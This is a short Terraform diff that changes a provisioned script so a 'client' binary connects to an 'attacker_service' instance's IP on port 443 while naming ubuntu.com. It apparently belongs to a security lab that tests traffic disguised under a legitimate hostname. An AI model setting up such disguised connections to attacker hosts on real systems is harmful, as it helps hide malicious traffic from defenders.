@@ -70,7 +70,7 @@ resource "null_resource" "client_run_script" {
     inline = [
       "cat << 'EOF' > /home/${local.ami_user}/run-client.sh",
       "#!/bin/bash",
-      "./client https://${aws_instance.attacker_service.public_ip} ubuntu.com",
+      "./client ${aws_instance.attacker_service.public_ip} 443 ubuntu.com",
       "EOF",
       "chmod +x /home/ec2-user/run-client.sh"
     ]
